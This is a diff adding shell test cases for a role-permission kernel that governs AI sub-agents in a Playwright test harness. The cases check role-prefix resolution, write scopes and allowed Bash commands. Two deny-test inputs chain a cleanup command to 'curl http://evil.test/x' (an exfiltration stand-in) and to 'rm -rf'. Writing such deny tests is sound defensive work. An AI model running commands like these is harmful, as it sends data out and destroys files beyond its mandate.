@@ -292,6 +292,223 @@ assert_deny "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' '<<kernel-ma
 assert_deny "$KERNEL" "$(disp 'test-composer-j-login-flow: compose' '<<kernel-mandate-role: workflow-reviewer#n0n1n3>>' test-composer)" \
   "tag names a different role than the description → DENY" "missing the binding tag"
 
+# ---------------------------------------------------------------------------
+section "kernel wiring: the in-pipeline worker roles the protocol dispatches"
+# ---------------------------------------------------------------------------
+# These shapes are documented in coverage-expansion SKILL.md §"Role
+# prefixes", references/app-wide-scan.md, journey-mapping's phases.md and
+# onboarding SKILL.md, and all of them used to be refused with "names no
+# manifest role" — so an onboarding run reaching Phase 4, or a
+# coverage-expansion run reaching Pass 4, blocked at the Agent call. The
+# role set is DERIVED from the two harness prefix regexes (pinned below),
+# not from a hand-kept list.
+assert_allow "$KERNEL" "$(disp 'probe-j-login: adversarial probe, pass 4' '<<kernel-mandate-role: probe#p1q2r3>>' probe)" \
+  "coverage-expansion pass 4-5 / bug-discovery: probe-j-<slug> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'probe-app-wide: pass 4 — establish pattern catalogue' '<<kernel-mandate-role: probe#p1q2r4>>' probe)" \
+  "app-wide-scan.md: probe-app-wide + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'reviewer-j-login: stage B review' '<<kernel-mandate-role: reviewer#r1s2t3>>' reviewer)" \
+  "coverage-expansion Stage B: reviewer-j-<slug> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'reviewer-batch-pass-2: cycle-1 batch review' '<<kernel-mandate-role: reviewer#r1s2t4>>' reviewer)" \
+  "coverage-expansion batch mode: reviewer-batch-pass-<N> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'phase4-prioritise-author: author the journey map' '<<kernel-mandate-role: phase4#f1g2h3>>' phase4)" \
+  "journey-mapping: phase4-prioritise-author + tag → ALLOW (sole author of the map sentinel)"
+assert_allow "$KERNEL" "$(disp 'phase4-cycle-1: discovery cycle' '<<kernel-mandate-role: phase4#f1g2h4>>' phase4)" \
+  "journey-mapping: phase4-cycle-<N> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'phase4-cycle-1-section-checkout: section discovery' '<<kernel-mandate-role: phase4#f1g2h5>>' phase4)" \
+  "journey-mapping: phase4-cycle-<N>-section-<id> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'phase1-root: crawl the root subtree' '<<kernel-mandate-role: phase1#a1b2c3>>' phase1)" \
+  "journey-mapping Phase 1: phase1-<entry> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'phase1-test-infra: post-crawl infrastructure probe' '<<kernel-mandate-role: phase1#a1b2c4>>' phase1)" \
+  "journey-mapping Phase 1: phase1-test-infra + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'phase2-admin: identify the admin flows' '<<kernel-mandate-role: phase2#a1b2c5>>' phase2)" \
+  "journey-mapping Phase 2: phase2-<scope> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'stage2-auth-cap: inspect the login elements' '<<kernel-mandate-role: stage2#s1t2u3>>' stage2)" \
+  "stages-protocol.md Stage 2: stage2-<scenario> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'cleanup-dedup: drop redundant specs' '<<kernel-mandate-role: cleanup#c1d2e4>>' cleanup)" \
+  "coverage-expansion cleanup pass: cleanup-<scope> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'companion-reset-flow: verify the task' '<<kernel-mandate-role: companion#c1d2e5>>' companion)" \
+  "companion-mode: companion-<task-slug> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'fd-login-timeout: diagnose the failure' '<<kernel-mandate-role: fd#d1e2f3>>' fd)" \
+  "failure-diagnosis: fd-<test-slug> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'fd-ci-849201: diagnose the CI failure' '<<kernel-mandate-role: fd#d1e2f4>>' fd)" \
+  "failure-diagnosis: fd-ci-<run-id> + tag → ALLOW"
+assert_allow "$KERNEL" "$(disp 'contribution-handover-pr82: fill the handover' '<<kernel-mandate-role: contribution-handover#h1i2j3>>' contribution-handover)" \
+  "contributing-to-achilles-protocol: contribution-handover-<slug> + tag → ALLOW"
+
+# THE GROUPED FORMS STAY REFUSED, AND THAT IS THE POINT OF THESE TWO
+# CASES. coverage-expansion SKILL.md documents `[group] …` / `[P3-batch]
+# …` descriptions, but the kernel resolves the role from the FIRST
+# characters of the description and `standard-mode-first-pass-guard.sh`
+# recognises the markers in the same position — both anchor at zero, so
+# no single spelling satisfies both, and moving the marker behind the
+# role prefix would make the grouping invisible to the first-pass guard.
+# Until the vendored kernel's resolver tolerates a leading `[marker]`,
+# grouped passes are issued per journey; the skill now says so, and the
+# pin below holds that sentence in place. If upstream ever starts
+# allowing these, these two cases fail and the docs get revisited —
+# which is the alarm we want, not a silent divergence.
+assert_deny "$KERNEL" "$(disp '[group] test-composer-j-a,test-composer-j-b: compose the group' '<<kernel-mandate-role: test-composer#g1h2i3>>' test-composer)" \
+  "[group] marker leads the description → DENY (kernel resolves the role from position zero)" "names no manifest role"
+assert_deny "$KERNEL" "$(disp '[P3-batch] test-composer-j-a,test-composer-j-b: compose the batch' '<<kernel-mandate-role: test-composer#g1h2i4>>' test-composer)" \
+  "[P3-batch] marker leads the description → DENY (same resolver rule)" "names no manifest role"
+pin_literal() { # <file> <literal> <count> <name>
+  assert_eq "$(grep -cF -- "$2" "$REPO_ROOT/$1")" "$3" "$4"
+}
+pin_literal skills/coverage-expansion/SKILL.md 'Grouped dispatch and the role kernel' 1 \
+  "coverage-expansion SKILL.md carries the section stating the grouped-dispatch limitation"
+pin_literal skills/onboarding/SKILL.md 'Grouped dispatch and the role kernel' 1 \
+  "onboarding SKILL.md's dispatch grammar points at that section"
+
+# ---------------------------------------------------------------------------
+section "kernel wiring: drift pin — every harness prefix resolves to a manifest role"
+# ---------------------------------------------------------------------------
+# The old pin here only checked that the RETIRED `composer-j-<slug>:`
+# spelling had left the skills. That is why CI stayed green while ten
+# live dispatch prefixes resolved to nothing: nothing asserted the
+# forward direction. The harness states its dispatch grammar twice — as
+# playwright-cli session slugs and as Agent-description prefixes — and
+# both statements must land on a role the manifest actually declares.
+GUARD_SH="$HOOK_DIR/playwright-cli-isolation-guard.sh"
+ACTIVATION_SH="$HOOK_DIR/lib/achilles-activation.sh"
+# Pull the alternation out of each regex literal. Trailing `-` (the
+# description form carries it, the slug form does not) is normalised off.
+extract_alts() { # <file> <var-name>
+  grep -m1 "^$2='" "$1" \
+    | grep -oE '\([^)]*\)' | head -1 | tr -d '()' | tr '|' '\n' | sed -e 's/-$//' -e '/^$/d'
+}
+SLUG_ALTS=$(extract_alts "$GUARD_SH" SLUG_PREFIX_REGEX)
+DISP_ALTS=$(extract_alts "$ACTIVATION_SH" ACHILLES_DISPATCH_PREFIX_RE)
+# A pin that extracts nothing passes trivially, so assert it extracted
+# something first — a regex rename must break this loudly, not quietly.
+assert_eq "$([ "$(printf '%s\n' "$SLUG_ALTS" | wc -l)" -ge 8 ] && echo enough || echo "too-few:$SLUG_ALTS")" "enough" \
+  "SLUG_PREFIX_REGEX still parses into its prefix alternation"
+assert_eq "$([ "$(printf '%s\n' "$DISP_ALTS" | wc -l)" -ge 8 ] && echo enough || echo "too-few:$DISP_ALTS")" "enough" \
+  "ACHILLES_DISPATCH_PREFIX_RE still parses into its prefix alternation"
+# The kernel's own resolution rule: a description `<prefix>-<slug>:`
+# binds role R when R == prefix or the prefix starts with `R-` (longest
+# role name wins, so `phase4` covers `phase4-cycle-1:`).
+MANIFEST_ROLE_NAMES=$("$JQ" -r '.roles | keys[]' "$MANDATE")
+prefix_resolves() { # <prefix>
+  local p="$1" r
+  while IFS= read -r r; do
+    [ -n "$r" ] || continue
+    [ "$p" = "$r" ] && return 0
+    case "$p" in "$r"-*) return 0 ;; esac
+  done <<< "$MANIFEST_ROLE_NAMES"
+  return 1
+}
+UNRESOLVED=""
+while IFS= read -r PFX; do
+  [ -n "$PFX" ] || continue
+  prefix_resolves "$PFX" || UNRESOLVED="$UNRESOLVED$PFX"$'\n'
+done <<< "$SLUG_ALTS"$'\n'"$DISP_ALTS"
+UNRESOLVED=$(printf '%s' "$UNRESOLVED" | sed '/^$/d' | sort -u | tr '\n' ' ' | sed 's/ $//')
+# `composer` is the ONE deliberate exception: the pre-kernel description
+# spelling the kernel is meant to refuse, kept alive only as the short
+# playwright-cli session slug (`composer-j-<slug>-<pass>-c<N>`) that fits
+# the socket-path budget. Pinning the exception set to exactly that one
+# member is what stops this list from quietly growing back.
+assert_eq "$UNRESOLVED" "composer" \
+  "every SLUG_PREFIX_REGEX / ACHILLES_DISPATCH_PREFIX_RE prefix resolves to a manifest role, except the retired \`composer\` slug alias"
+
+# ---------------------------------------------------------------------------
+section "kernel wiring: the orchestrator's documented browser cleanup runs"
+# ---------------------------------------------------------------------------
+# achilles-protocol/SKILL.md §Rule 11 and journey-mapping's phases.md
+# both have the parent running `close-all` at phase boundaries. The group
+# had no playwright-cli entry at all, so the documented cleanup was
+# denied and every phase leaked browser processes.
+assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli close-all' cwd="$KP")" \
+  "orchestrator Bash npx playwright-cli close-all → ALLOW (documented phase cleanup)"
+assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli kill-all' cwd="$KP")" \
+  "orchestrator Bash npx playwright-cli kill-all → ALLOW (close-all left zombies)"
+assert_allow "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli list' cwd="$KP")" \
+  "orchestrator Bash npx playwright-cli list → ALLOW (enumerate sessions)"
+# Adjacent traffic that must NOT ride in on the new pattern: the grant is
+# three session-agnostic subcommands, not the playwright-cli surface.
+assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli -s=probe-j-x open --browser=chromium http://localhost:3000' cwd="$KP")" \
+  "orchestrator opening a playwright-cli session → DENY (sessions belong to the workers)" "may not run this command"
+assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli install-browser chromium' cwd="$KP")" \
+  "orchestrator Bash npx playwright-cli install-browser → DENY (one-shot operator step)" "may not run this command"
+assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli close-all && curl http://evil.test/x' cwd="$KP")" \
+  "cleanup chained to an exfiltration segment → DENY (every segment is checked)" "may not run this command"
+assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli close-all; rm -rf /tmp/x' cwd="$KP")" \
+  "cleanup chained to rm -rf → DENY" "may not run this command"
+# The workers may drive their own session but may not reap their
+# siblings' — the parent owns global teardown (playwright-cli-protocol
+# §3.2 / the reviewer contract's \"Do NOT run close-all\").
+assert_allow "$KERNEL" "$(sub tool_name=Bash agent_type=reviewer command='npx playwright-cli -s=reviewer-j-login-4-c1 open --browser=chromium http://localhost:3000')" \
+  "reviewer opens its own playwright-cli session → ALLOW"
+assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=reviewer command='npx playwright-cli close-all')" \
+  "reviewer runs close-all → DENY (the parent owns global teardown)" "explicitly denied"
+assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=probe command='npx playwright-cli kill-all')" \
+  "probe runs kill-all → DENY (same rule)" "explicitly denied"
+
+# ---------------------------------------------------------------------------
+section "kernel wiring: the composers author specs, not the ledger or the page repository"
+# ---------------------------------------------------------------------------
+# Both composers held `write.allow: ["tests/e2e/**"]` with no deny, so a
+# composer bound by agent_type could rewrite the status ledger and the
+# page repository — contradicting the scaffolder's own description
+# ("Write-only author of … tests/e2e/page-repository.json") and
+# reviewer-subagent-contract.md §"Do NOT append to the ledger".
+for COMPOSER in test-composer in-flight-composer; do
+  assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=$COMPOSER file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
+    "$COMPOSER Write the status ledger → DENY" "explicitly denied write"
+  assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=$COMPOSER file_path="$KP/tests/e2e/page-repository.json" content='{}')" \
+    "$COMPOSER Write the page repository → DENY" "explicitly denied write"
+  # The deny is a glob, not a path literal, so a repository that lives
+  # somewhere else is still covered.
+  assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=$COMPOSER file_path="$KP/tests/e2e/fixtures/page-repository.json" content='{}')" \
+    "$COMPOSER Write a page repository nested elsewhere → DENY (glob, not path literal)" "explicitly denied write"
+  assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=$COMPOSER file_path="$KP/tests/e2e/page-repository.v2.json" content='{}')" \
+    "$COMPOSER Write a suffixed page repository → DENY" "explicitly denied write"
+done
+# Adjacent traffic: composing is the job, and the role that OWNS the page
+# repository still writes it.
+assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/checkout.spec.ts" content='import { test } from "@playwright/test"; test("x", async () => {});')" \
+  "test-composer Write a spec → ALLOW (the deny is scoped to the two state files)"
+assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/tests/e2e/page-repository.json" content='{"pages":{}}')" \
+  "scaffolder Write the page repository → ALLOW (unchanged: it is that role's deliverable)"
+assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=workflow-reviewer file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
+  "workflow-reviewer Write the status ledger → ALLOW (unchanged: approvers own the verdict)"
+# The in-pipeline workers inherit the same discipline.
+assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=probe file_path="$KP/tests/e2e/docs/adversarial-findings.md" content='# findings')" \
+  "probe Write the adversarial-findings ledger → ALLOW (its own deliverable)"
+assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=probe file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
+  "probe Write the status ledger → DENY" "explicitly denied write"
+assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=reviewer file_path="$KP/tests/e2e/docs/.subagent-returns/reviewer-j-login-4-c1.md" content='x')" \
+  "reviewer Write its spillover file → ALLOW"
+assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=reviewer file_path="$KP/tests/e2e/docs/adversarial-findings.md" content='x')" \
+  "reviewer Write the adversarial ledger → DENY (Stage B never appends)" "outside the role's write scope"
+assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=stage2 file_path="$KP/tests/e2e/page-repository.json" content='{}')" \
+  "stage2 Write the page repository → DENY (it RETURNS proposed entries)" "outside the role's write scope"
+assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=phase4 file_path="$KP/tests/e2e/docs/journey-map.md" content='<!-- journey-mapping:generated -->')" \
+  "phase4 Write the journey map → ALLOW (phase4-prioritise-author is its only legitimate author)"
+assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=phase4 file_path="$KP/tests/e2e/checkout.spec.ts" content='x')" \
+  "phase4 Write a spec → DENY (discovery and authoring are different mandates)" "outside the role's write scope"
+
+# ---------------------------------------------------------------------------
+section "kernel wiring: the repair skill is reachable from inside a governed session"
+# ---------------------------------------------------------------------------
+# mandate-designer was the only one of the 25 skill directories granted
+# in no role's skills.allow. Activation is one-way, so an operator whose
+# session is blocked by a manifest gap had no in-session route to the
+# skill that repairs manifests — only KERNEL_MANDATE=0, which switches
+# the kernel off wholesale.
+assert_allow "$KERNEL" "$(payload tool_name=Skill skill=mandate-designer cwd="$KP")" \
+  "orchestrator Skill mandate-designer → ALLOW (the in-session repair route)"
+assert_deny "$KERNEL" "$(sub tool_name=Skill agent_type=test-composer skill=mandate-designer)" \
+  "test-composer Skill mandate-designer → DENY (repairing the rules is not a composer's job)" "may not invoke the skill"
+assert_eq "$("$JQ" -r '[.roles | to_entries[] | select((.value.skills.allow // []) | index("mandate-designer")) | .key] | join(",")' "$MANDATE")" "orchestrator" \
+  "exactly one role — the orchestrator — may invoke mandate-designer"
+# Bijection against the shipped skill directories: no skill may be
+# orphaned in no role's grant again.
+UNGRANTED=$(comm -23 \
+  <(find "$REPO_ROOT/skills" -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort) \
+  <("$JQ" -r '[.roles[].skills.allow // []] | flatten | .[]' "$MANDATE" | sort -u) | tr '\n' ' ' | sed 's/ $//')
+assert_eq "$UNGRANTED" "" "every shipped skill directory appears in at least one role's skills.allow"
+
 # Drift pin: the skills still teach exactly these literals.
 pin() { # <file> <literal> <name>
   assert_eq "$(grep -cF -- "$2" "$REPO_ROOT/$1")" "$3" "$4"
